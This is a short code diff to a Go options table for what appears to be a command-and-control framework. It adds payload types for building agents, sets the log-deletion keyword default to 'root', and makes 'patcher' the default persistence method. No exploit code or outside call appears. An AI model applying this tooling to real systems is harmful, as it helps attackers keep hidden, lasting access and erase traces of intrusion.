@@ -89,13 +89,16 @@ var Modules = map[string]*ModConfig{
 		Date:          "2020-01-25",
 		Comment:       "Build agent for different OS/arch with customized options",
 		Options: ModOptions{
-			"os": &ModOption{
-				OptName: "os",
-				OptDesc: "Target OS, available OS: linux, windows, dll",
+			"payload_type": &ModOption{
+				OptName: "payload_type",
+				OptDesc: `Target OS and payload_type, eg. "linux_executable", "windows_dll", "windows_exeuatable", "linux_so"`,
+				OptVals: []string{"linux_executable", "windows_dll", "windows_exeuatable", "linux_so"},
+				OptVal:  "linux_executable",
 			},
 			"arch": &ModOption{
 				OptName: "arch",
 				OptDesc: "Target architecture, available arch: amd64, 386, arm, arm64, etc",
+				OptVal:  "amd64",
 			},
 			"cc_host": &ModOption{
 				OptName: "cc_host",
@@ -180,6 +183,7 @@ var Modules = map[string]*ModConfig{
 				OptName: "keyword",
 				OptDesc: "Delete all log entries containing this keyword",
 				OptVals: []string{"root", "admin"},
+				OptVal:  "root",
 			},
 		},
 	},
@@ -215,7 +219,7 @@ var Modules = map[string]*ModConfig{
 				OptName: "method",
 				OptDesc: fmt.Sprintf("Persistence method: profiles: %s; cron: %s; patcher: %s", PersistMethods["profiles"], PersistMethods["cron"], PersistMethods["patcher"]),
 				OptVals: []string{"profiles", "cron", "patcher"},
-				OptVal:  "profiles",
+				OptVal:  "patcher",
 			},
 		},
 	},
